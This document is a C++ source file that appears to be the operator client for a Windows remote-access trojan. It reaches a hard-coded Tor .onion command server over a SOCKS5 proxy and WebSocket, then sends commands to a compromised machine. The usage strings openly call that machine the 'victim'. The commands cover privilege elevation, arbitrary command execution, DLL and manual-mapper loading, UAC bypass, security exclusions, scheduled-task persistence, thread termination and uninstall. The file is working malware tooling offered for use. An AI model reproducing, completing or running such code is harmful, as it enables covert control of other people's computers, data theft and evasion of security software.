#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string>
#include <fstream>
#include <iostream>
#include <sstream>
#include <vector>
#include <stdexcept>
#include <ctime>
#include <tuple>
#include <cstdio>
#include <cstdlib>
#include <algorithm>
#include <utility>
#include <unordered_map>
#include <cstring>
#include <cstdint>
#include <functional>
#include <random>

//compile with: cl.exe /EHsc /std:c++17 ws.cpp /link ws2_32.lib Advapi32.lib User32.lib


#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "User32.lib")


void close_socket(SOCKET s) {
    if (s != INVALID_SOCKET) {
        shutdown(s, SD_BOTH);
        closesocket(s);
    }
}

SOCKET socks5_connect(const char* proxy_ip, int proxy_port, const char* host, int port) {
    WSADATA w{};
    if (WSAStartup(MAKEWORD(2, 2), &w) != 0) {
        std::cerr << "[!] WSAStartup failed\n";
        return INVALID_SOCKET;
    }

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) {
        std::cerr << "[!] socket() failed\n";
        WSACleanup();
        return INVALID_SOCKET;
    }

    sockaddr_in proxy_addr{};
    proxy_addr.sin_family = AF_INET;
    proxy_addr.sin_port = htons((unsigned short)proxy_port);
    inet_pton(AF_INET, proxy_ip, &proxy_addr.sin_addr);

    if (connect(s, (sockaddr*)&proxy_addr, sizeof(proxy_addr)) != 0) {
        std::cerr << "[!] connect() to SOCKS5 proxy failed\n";
        closesocket(s);
        WSACleanup();
        return INVALID_SOCKET;
    }

    std::cout << "[*] Connected to SOCKS5 proxy\n";

    // Greeting
    unsigned char greet[3] = { 0x05, 0x01, 0x00 };
    if (send(s, (char*)greet, 3, 0) != 3) {
        std::cerr << "[!] SOCKS5 send greeting failed\n";
        close_socket(s); WSACleanup(); return INVALID_SOCKET;
    }

    unsigned char resp[2];
    if (recv(s, (char*)resp, 2, 0) != 2) {
        std::cerr << "[!] SOCKS5 greeting response failed\n";
        close_socket(s); WSACleanup(); return INVALID_SOCKET;
    }

    std::cout << "[*] SOCKS5 greeting response: "
        << std::hex << (int)resp[0] << " " << (int)resp[1] << "\n";

    if (resp[1] != 0x00) {
        std::cerr << "[!] SOCKS5 no acceptable auth\n";
        close_socket(s); WSACleanup(); return INVALID_SOCKET;
    }

    // CONNECT request using domain name
    std::string hostStr(host);
    std::vector<unsigned char> req;
    req.push_back(0x05); req.push_back(0x01); req.push_back(0x00); req.push_back(0x03);
    req.push_back((unsigned char)hostStr.size());
    req.insert(req.end(), hostStr.begin(), hostStr.end());
    req.push_back((unsigned char)((port >> 8) & 0xFF));
    req.push_back((unsigned char)(port & 0xFF));

    if (send(s, (char*)req.data(), (int)req.size(), 0) != (int)req.size()) {
        std::cerr << "[!] SOCKS5 CONNECT send failed\n";
        close_socket(s); WSACleanup(); return INVALID_SOCKET;
    }

    std::cout << "[*] Sent SOCKS5 CONNECT for " << host << ":" << port << "\n";

    // Read response
    unsigned char baseRep[4];
    if (recv(s, (char*)baseRep, 4, 0) != 4) {
        std::cerr << "[!] SOCKS5 CONNECT response failed\n";
        close_socket(s); WSACleanup(); return INVALID_SOCKET;
    }
    if (baseRep[1] != 0x00) {
        std::cerr << "[!] SOCKS5 CONNECT rejected, reply=" << std::hex << (int)baseRep[1] << "\n";
        close_socket(s); WSACleanup(); return INVALID_SOCKET;
    }

    std::cout << "[*] SOCKS5 CONNECT succeeded\n";

    // consume remaining bytes depending on ATYP
    unsigned char atyp = baseRep[3];
    int remaining = 0;
    if (atyp == 0x01) remaining = 6;
    else if (atyp == 0x03) {
        unsigned char lenb;
        if (recv(s, (char*)&lenb, 1, 0) != 1) { close_socket(s); WSACleanup(); return INVALID_SOCKET; }
        remaining = lenb + 2;
    }
    else if (atyp == 0x04) remaining = 18;

    if (remaining > 0) {
        std::vector<unsigned char> tmp(remaining);
        if (recv(s, (char*)tmp.data(), remaining, 0) != remaining) { close_socket(s); WSACleanup(); return INVALID_SOCKET; }
    }

    std::cout << "[*] SOCKS5 CONNECT completed\n";

    return s;
}

bool do_websocket_handshake(SOCKET s, const std::string& hostHeader, const std::string& resource, std::string& out_key) {
    out_key = "TESTKEY12345678"; // or generate_ws_key()
    std::ostringstream hdr;
    hdr << "GET " << resource << " HTTP/1.1\r\n";
    hdr << "Host: " << hostHeader << "\r\n";
    hdr << "Upgrade: websocket\r\n";
    hdr << "Connection: Upgrade\r\n";
    hdr << "Sec-WebSocket-Key: " << out_key << "\r\n";
    hdr << "Sec-WebSocket-Version: 13\r\n";
    hdr << "\r\n";

    std::string req = hdr.str();
    std::cout << "[*] WebSocket handshake request:\n" << req << "\n";

    if (send(s, req.c_str(), (int)req.size(), 0) != (int)req.size()) {
        std::cerr << "[!] WebSocket handshake send failed\n";
        close_socket(s); return false;
    }

    std::string resp;
    char buf[1024];
    int n;
    while (true) {
        n = recv(s, buf, sizeof(buf), 0);
        if (n <= 0) { close_socket(s); std::cerr << "[!] WebSocket handshake recv failed\n"; return false; }
        resp.append(buf, buf + n);
        if (resp.find("\r\n\r\n") != std::string::npos) break;
    }

    std::cout << "[*] WebSocket handshake response:\n" << resp << "\n";

    if (resp.find("HTTP/1.1 101") == std::string::npos && resp.find("HTTP/1.0 101") == std::string::npos) {
        std::cerr << "[!] WebSocket handshake failed\n";
        close_socket(s); return false;
    }

    return true;
}

SOCKET upgrade(const char* proxy_ip, int proxy_port, const char* host, int port, const char* resource) {
    SOCKET s = socks5_connect(proxy_ip, proxy_port, host, port);
    if (s == INVALID_SOCKET) return INVALID_SOCKET;

    std::string hostHeader = host;
    if (strstr(host, ".onion") == nullptr && port != 80 && port != 443) {
        hostHeader += ":" + std::to_string(port);
    }

    std::string key;
    if (!do_websocket_handshake(s, hostHeader, resource, key)) {
        closesocket(s); WSACleanup();
        return INVALID_SOCKET;
    }

    std::cout << "[*] WebSocket upgraded successfully\n";
    return s;
}

bool send_over_socket(SOCKET s, const std::vector<unsigned char>& data) {
    if (s == INVALID_SOCKET) return false;

    std::vector<unsigned char> frame;
    // FIN + binary (0x82)
    frame.push_back(0x81);

    size_t len = data.size();
    if (len <= 125) {
        frame.push_back((unsigned char)(0x80 | (unsigned char)len)); // MASK bit set
    }
    else if (len <= 0xFFFF) {
        frame.push_back((unsigned char)(0x80 | 126));
        frame.push_back((unsigned char)((len >> 8) & 0xFF));
        frame.push_back((unsigned char)(len & 0xFF));
    }
    else {
        frame.push_back((unsigned char)(0x80 | 127));
        // 64-bit length network order
        for (int i = 7; i >= 0; --i) frame.push_back((unsigned char)((len >> (8 * i)) & 0xFF));
    }

    // generate 4-byte mask
    unsigned char mask[4];
    std::random_device rd;
    for (int i = 0; i < 4; ++i) mask[i] = (unsigned char)(rd() & 0xFF);
    frame.insert(frame.end(), mask, mask + 4);

    // masked payload
    for (size_t i = 0; i < len; ++i) {
        unsigned char b = data[i] ^ mask[i % 4];
        frame.push_back(b);
    }

    int sent = 0;
    int tosend = (int)frame.size();
    const char* ptr = (const char*)frame.data();
    while (sent < tosend) {
        int n = send(s, ptr + sent, tosend - sent, 0);
        if (n <= 0) return false;
        sent += n;
    }
    return true;
}

bool recv_one_frame(SOCKET ws, std::vector<unsigned char>& payload, unsigned char& opcode) {
    payload.clear();

    unsigned char hdr[2];
    int n = recv(ws, (char*)hdr, 2, 0);
    if (n != 2) {
        std::cout << "[ERROR] Failed to read WebSocket header, recv returned " << n << "\n";
        return false;
    }

    opcode = hdr[0] & 0x0F;
    bool fin = (hdr[0] & 0x80) != 0;
    bool masked = (hdr[1] & 0x80) != 0;
    uint64_t payload_len = hdr[1] & 0x7F;

    // Extended payload
    if (payload_len == 126) {
        unsigned char ext[2];
        if (recv(ws, (char*)ext, 2, 0) != 2) {
            std::cout << "[ERROR] Failed to read extended payload length (16-bit)\n";
            return false;
        }
        payload_len = (ext[0] << 8) | ext[1];
    }
    else if (payload_len == 127) {
        unsigned char ext[8];
        if (recv(ws, (char*)ext, 8, 0) != 8) {
            std::cout << "[ERROR] Failed to read extended payload length (64-bit)\n";
            return false;
        }
        payload_len = 0;
        for (int i = 0; i < 8; ++i)
            payload_len = (payload_len << 8) | ext[i];
    }

    // Mask
    unsigned char mask[4] = { 0 };
    if (masked) {
        if (recv(ws, (char*)mask, 4, 0) != 4) {
            std::cout << "[ERROR] Failed to read mask key\n";
            return false;
        }
    }

    // Payload
    payload.resize(payload_len);
    size_t total_read = 0;
    while (total_read < payload_len) {
        int r = recv(ws, (char*)payload.data() + total_read, (int)(payload_len - total_read), 0);
        if (r <= 0) {
            std::cout << "[ERROR] Failed to read payload or connection closed, recv returned " << r << "\n";
            return false;
        }
        total_read += r;
    }

    // Unmask
    if (masked) {
        for (uint64_t i = 0; i < payload_len; ++i)
            payload[i] ^= mask[i % 4];
    }

    return true;
}

std::vector<std::string> split_and_trim(const std::string& line) {
    std::vector<std::string> args;
    std::istringstream iss(line);
    std::string token;

    while (iss >> token) { // automatically splits on whitespace
        // trim leading and trailing whitespace
        token.erase(token.begin(), std::find_if(token.begin(), token.end(), [](unsigned char ch){ return !std::isspace(ch); }));
        token.erase(std::find_if(token.rbegin(), token.rend(), [](unsigned char ch){ return !std::isspace(ch); }).base(), token.end());

        if (!token.empty())
            args.push_back(token);
    }
    return args;
}

std::string join_args(const std::vector<std::string>& args, const std::string& sep = " ") {
    std::ostringstream oss;
    for (size_t i = 0; i < args.size(); ++i) {
        if (i != 0) oss << sep;
        oss << args[i];
    }
    return oss.str();
}

std::string sanitize_arg(const std::string& input) {
    std::string s = input;

    // Replace backslashes with double backslashes
    size_t pos = 0;
    while ((pos = s.find("\\", pos)) != std::string::npos) {
        s.replace(pos, 1, "\\\\");
        pos += 2; // skip the newly inserted double backslash
    }

    // Replace forward slashes with backslashes
    pos = 0;
    while ((pos = s.find("/", pos)) != std::string::npos) {
        s.replace(pos, 1, "\\\\");
        pos += 2;
    }

    // Strip leading and trailing quotes
    if (!s.empty() && (s.front() == '"' || s.front() == '\'')) s.erase(0, 1);
    if (!s.empty() && (s.back() == '"' || s.back() == '\'')) s.pop_back();

    return s;
}

std::vector<std::string> splitPath(const char* arg, int& errorCode) {
    errorCode = 0;
    std::vector<std::string> result;
    
    if (!arg || !arg[0]) {
        errorCode = 1;  // Both empty
        return result;
    }
    
    // Find last /
    const char* lastSlash = strrchr(arg, '/');
    
    if (!lastSlash) {
        // No / - treat as filename (empty dir)
        result.push_back("");      // Before (dir)
        result.push_back(arg);     // After (file)
        errorCode = 1;
        return result;
    }
    
    // Split at last /
    std::string before(lastSlash == arg ? "" : std::string(arg, lastSlash - arg));
    std::string after(lastSlash + 1);
    
    // Check empty sides
    if (after.empty()) {
        errorCode = 1;
        return result;
    }
    
    result.push_back(before);
    result.push_back(after);
    return result;
}

std::string trim_leading_newlines(std::string s) {
    // Remove leading \n, \r, \r\n
    size_t start = s.find_first_not_of("\r\n");
    if (start == std::string::npos) {
        return "";  // All newlines
    }
    return s.substr(start);
}

int main() {
    const char* URL = "we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion";

    SOCKET ws = upgrade("127.0.0.1", 9050, URL, 8576, "/ws");

    if (ws == INVALID_SOCKET) {
        std::cout << "Failed to initialize WebSocket\n";
        return 1;
    }
    
    std::vector<unsigned char> payloadbuffer;
    unsigned char opcode;

    std::string message = "__GAIN_ADMIN__";

    std::vector<unsigned char> elevate(message.begin(), message.end());

    if (!send_over_socket(ws, elevate)) {
            std::cout << "Connection closed or error\n";
            return 1;
        }

    std::string prompt = "['exit' to quit]:\033[36m ";

    for (;;) {
        bool exit = false;
        std::string input;
        std::cout << prompt;
        std::getline(std::cin, input);
        std::cout << "\033[0m";

        // ---------------- CD ----------------
        if (input.compare(0, 5, "EOT<<") == 0) {
            std::cout << "Typing multiline command. Type \"EOT\" to exit\n";
            input = input.substr(5);
            while (true) {
                std::string line;
                std::getline(std::cin, line);
                if (line == "EOT") {
                    break;
                }
                input += "\n" + line;
            }
            input = trim_leading_newlines(input);
        }

        if (input.compare(0, 2, "cd") == 0) {
            input = "__CD__ ### " + input;
            std::vector<unsigned char> body(input.begin(), input.end());
            if (!send_over_socket(ws, body)) {
                std::cout << "Connection closed or error\n";
                continue;
            }

            if (!recv_one_frame(ws, payloadbuffer, opcode)) {
                std::cout << "Connection closed or error\n";
                continue;
            }

            if (opcode == 0x1) {
                std::string txt(payloadbuffer.begin(), payloadbuffer.end());
                prompt = txt + ">\033[36m ";
            }
            continue;
        }
        else if (input.compare(0, 4, "proc") == 0) {
            input = "__PROC__";
        }

        // ---------------- MSG ----------------
        else if (input.compare(0, 3, "msg") == 0) {
            std::vector<std::string> args = split_and_trim(input);

            if (args.size() == 0) {
                std::cout << "[ERROR] Usage: msg <error/info/warning> <message>\n";
                continue;
            }
            if (args.size() < 2) {
                args.insert(args.begin() + 1, "info");
            }

            input = join_args(args, " ");
            input = "__MSG__ ### " + input.substr(4);
        }

        // ---------------- DLL ----------------
        else if (input.compare(0, 3, "dll") == 0) {
            std::vector<std::string> args = split_and_trim(input);

            if (args.size() < 2) {
                std::cout << "[ERROR] Usage: dll <path_to_dll_on_victim> <main_func_name>\n";
                continue;
            }

            args[1] = sanitize_arg(args[1]);
            input = join_args(args, " ");
            input = "__LOAD_DLL__ ### " + input.substr(4);
        }

        // ---------------- MAP ----------------
        else if (input.compare(0, 3, "map") == 0) {
            std::vector<std::string> args = split_and_trim(input);

            int index = 0;
            if (index >= 0 && index < args.size()) {
                args.erase(args.begin() + index);
            }

            if (args.size() < 4) {
                std::cout << "[ERROR] Usage: map <path_to_mapper_on_victim> <dll_main_func_name> <url> <main_func_name>\n";
                continue;
            }

            int errorCode = 0;
            std::vector<std::string> pathParts = splitPath(args[2].c_str(), errorCode);
            if (errorCode != 0) {
                std::cout << "[ERROR] Invalid path: " << args[2] << "\n";
                continue;
            }
            if (pathParts[0] == "") {
                args[2] = "/" + pathParts[1];
                args.insert(args.begin() + 2, URL);
            }
            else {
                args[2] = pathParts[0];
                args.insert(args.begin() + 3, "/" + pathParts[1]);
            }

            args[0] = sanitize_arg(args[0]);
            input = join_args(args, " ");
            input = "__LOAD_MAPPER__ ### " + input;
        }

        else if (input.compare(0, 3, "uac") == 0) {
            std::vector<std::string> args = split_and_trim(input);

            int index = 0;
            if (index >= 0 && index < args.size()) {
                args.erase(args.begin() + index);
            }
            if (args.size() < 1) {
                std::cout << "[ERROR] Usage: uac <path_to_executable> [<args>] or just \"execute\"\n";
                continue;
            }

            for (int i = 0; i < args.size(); i++) {
                args[i] = sanitize_arg(args[i]);
            }

            input = join_args(args, " ");
            input = "__UAC__ ### " + input;
        }

        else if (input.compare(0, 7, "exclude") == 0) {
            std::vector<std::string> args = split_and_trim(input);

            int index = 0;
            if (index >= 0 && index < args.size()) {
                args.erase(args.begin() + index);
            }
            if (args.size() < 1) {
                std::cout << "[ERROR] Usage: exclude <path_to_exclude>\n";
                continue;
            }

            input = join_args(args, " ");
            input = "__EXCLUDE__ ### " + input;
        }

        else if (input.compare(0, 5, "task ") == 0) {
            std::vector<std::string> args = split_and_trim(input);

            int index = 0;
            if (index >= 0 && index < args.size()) {
                args.erase(args.begin() + index);
            }

            if (args.size() < 1) {
                std::cout << "[ERROR] Usage: task <path_to_executable>\n";
                continue;
            }

            input = join_args(args, " ");
            input = "__TASK__ ### " + input;
        }

        // ---------------- UNINSTALL ----------------
        else if (input.compare(0, 9, "uninstall") == 0) {
            std::vector<std::string> args = split_and_trim(input);
            int index = 0;

            if (index >= 0 && index < args.size()) {
                args.erase(args.begin() + index);
            }
            if (args.size() < 2) {
                std::cout << "[ERROR] Usage: uninstall <dir>\n";
                continue;
            }
            std::string argstr = join_args(args, " ");
            input = "__UNINSTALL__ ### " + argstr;
        }

        // ---------------- UPGRADE ----------------
        else if (input.compare(0, 7, "upgrade") == 0) {
            input = "__UPGRADE__";
        }

        // ---------------- DOWNGRADE ----------------
        else if (input.compare(0, 9, "downgrade") == 0 || input.compare(0, 4, "exit") == 0) {
            input = "__DOWNGRADE__";
            exit = true;
        }

        // ---------------- THREADS / THREAD ----------------
        else if (input.compare(0, 7, "threads") == 0 || input.compare(0, 6, "thread") == 0) {
            std::vector<std::string> args = split_and_trim(input);
            int index = 0; // pop element at index 2 ("c")

            if (index >= 0 && index < args.size()) {
                args.erase(args.begin() + index);
            }

            if (args.empty()) {
                args.push_back("get");
            }
            else if (args.size() > 2) {
                std::cout << "[ERROR] Usage: thread <name/id/get> <get/suspend/terminate/resume>\n";
                continue;
            }

            if (args[0].find_first_not_of("0123456789") == std::string::npos) {
                args.insert(args.begin(), "id");
            } else {
                args.insert(args.begin(), "name");
            }

            if (args[0] == "id") args[0] = "id";
            else args[0] = "name";

            if (join_args(args, " ") == "name get") args = {"get"};

            input = "__THREADS__ ### " + join_args(args, " ");
        }

        else if (input.compare(0, 4, "quit") == 0){
            // No arguments required, but we still parse for consistency
            std::vector<std::string> args = split_and_trim(input);

            // If arguments were supplied incorrectly
            if (args.size() > 1) {
                std::cout << "[ERROR] Usage: quit\n";
                continue;
            }

            input = "__QUIT__";
        }

        // ---------------- EXECUTE (fallback) ----------------
        else {
            input = "__EXECUTE__ ### " + input;
        }

        std::vector<unsigned char> body(input.begin(), input.end());
        if (!send_over_socket(ws, body)) {
                    std::cout << "Connection closed or error\n";
                    continue;
        }
        if (exit) {
            break;
        }
        if (!recv_one_frame(ws, payloadbuffer, opcode)) {
            std::cout << "Connection closed or error\n";
            break;
        }
        if (opcode == 0x1) { // text
            std::string txt(payloadbuffer.begin(), payloadbuffer.end());
            std::cout << txt << "\n";
        }
    }
    return 0;
}


